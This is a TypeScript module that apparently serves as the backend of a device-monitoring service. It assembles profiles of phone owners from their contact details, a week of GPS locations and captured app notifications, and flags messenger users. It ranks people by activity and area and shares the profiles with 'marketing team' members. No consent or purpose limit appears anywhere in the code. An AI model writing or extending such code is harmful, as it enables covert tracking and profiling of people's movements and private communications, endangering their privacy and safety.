import { getUserByDeviceId, eachRegisteredDevice } from "./auth.js";
import { assertAdmin } from "./authKeys.js";
import { getLocations, getNotifications } from "./intelStore.js";
import { listDevices } from "./relay.js";
import { areaFromCoords } from "./areaLabel.js";
import type { MarketingMember } from "./marketingTeam.js";

export type DeviceSort = "area" | "name" | "activity" | "online" | "recent";

export interface DeviceProfile {
  deviceId: string;
  label: string;
  model: string;
  ownerName: string;
  ownerEmail: string;
  ownerPhone: string;
  online: boolean;
  lastSeen: number;
  area: string;
  lat?: number;
  lng?: number;
  locationAccuracy?: number;
  locationAt?: number;
  notificationCount: number;
  activityScore: number;
  tags: string[];
  shortId: string;
}

function weekAgo() {
  return Date.now() - 7 * 86_400_000;
}

function buildOne(deviceId: string): DeviceProfile {
  const relay = listDevices().find((d) => d.deviceId === deviceId);
  const owner = getUserByDeviceId(deviceId);
  const device = owner?.devices.find((d) => d.deviceId === deviceId);
  const locs = getLocations(deviceId, weekAgo());
  const lastLoc = locs[0];
  const notifs = getNotifications(deviceId, weekAgo());
  const tags: string[] = [];
  if (notifs.length >= 10) tags.push("High activity");
  if (notifs.length === 0) tags.push("Quiet");
  const messenger = notifs.filter((n) =>
    /whatsapp|telegram|messenger|instagram/i.test(`${n.app} ${n.pkg}`),
  );
  if (messenger.length >= 3) tags.push("Messenger user");

  const area = lastLoc ? areaFromCoords(lastLoc.lat, lastLoc.lng) : "Unknown area";
  const activityScore = notifs.length + locs.length;

  return {
    deviceId,
    shortId: deviceId.slice(0, 8),
    label: relay?.name || device?.label || owner?.name || deviceId.slice(0, 8),
    model: relay?.model || device?.model || "",
    ownerName: owner?.name || relay?.ownerName || "",
    ownerEmail: owner?.email || relay?.ownerEmail || "",
    ownerPhone: owner?.phone || relay?.ownerPhone || "",
    online: relay?.online ?? false,
    lastSeen: relay?.lastSeen ?? 0,
    area,
    lat: lastLoc?.lat,
    lng: lastLoc?.lng,
    locationAccuracy: lastLoc?.accuracy,
    locationAt: lastLoc?.ts,
    notificationCount: notifs.length,
    activityScore,
    tags,
  };
}

export function listDeviceProfiles(opts?: {
  deviceIds?: string[];
  sort?: DeviceSort;
  area?: string;
  onlineOnly?: boolean;
  q?: string;
}): DeviceProfile[] {
  const ids = new Set<string>();
  if (opts?.deviceIds?.length) {
    for (const id of opts.deviceIds) ids.add(id);
  } else {
    listDevices().forEach((d) => ids.add(d.deviceId));
    eachRegisteredDevice((deviceId) => ids.add(deviceId));
  }

  let profiles = [...ids].map(buildOne);

  const q = opts?.q?.trim().toLowerCase();
  if (q) {
    profiles = profiles.filter(
      (p) =>
        p.label.toLowerCase().includes(q) ||
        p.ownerName.toLowerCase().includes(q) ||
        p.ownerEmail.toLowerCase().includes(q) ||
        p.area.toLowerCase().includes(q) ||
        p.model.toLowerCase().includes(q) ||
        p.deviceId.toLowerCase().includes(q),
    );
  }

  if (opts?.area && opts.area !== "all") {
    profiles = profiles.filter((p) => p.area === opts.area);
  }

  if (opts?.onlineOnly) {
    profiles = profiles.filter((p) => p.online);
  }

  const sort = opts?.sort ?? "recent";
  profiles.sort((a, b) => {
    switch (sort) {
      case "area":
        return a.area.localeCompare(b.area) || b.activityScore - a.activityScore;
      case "name":
        return a.label.localeCompare(b.label);
      case "activity":
        return b.activityScore - a.activityScore;
      case "online":
        if (a.online !== b.online) return a.online ? -1 : 1;
        return b.lastSeen - a.lastSeen;
      case "recent":
      default:
        return b.lastSeen - a.lastSeen;
    }
  });

  return profiles;
}

export function listAreas(deviceIds?: string[]): string[] {
  const profiles = listDeviceProfiles({ deviceIds, sort: "area" });
  const areas = new Set(profiles.map((p) => p.area).filter((a) => a !== "Unknown area"));
  return [...areas].sort();
}

export function listDeviceProfilesAdmin(
  editKey: string | undefined,
  opts?: Parameters<typeof listDeviceProfiles>[0],
) {
  assertAdmin(editKey);
  return listDeviceProfiles(opts);
}

export function listDeviceProfilesForMember(
  member: MarketingMember,
  opts?: Omit<NonNullable<Parameters<typeof listDeviceProfiles>[0]>, "deviceIds">,
) {
  return listDeviceProfiles({ ...opts, deviceIds: member.deviceIds });
}
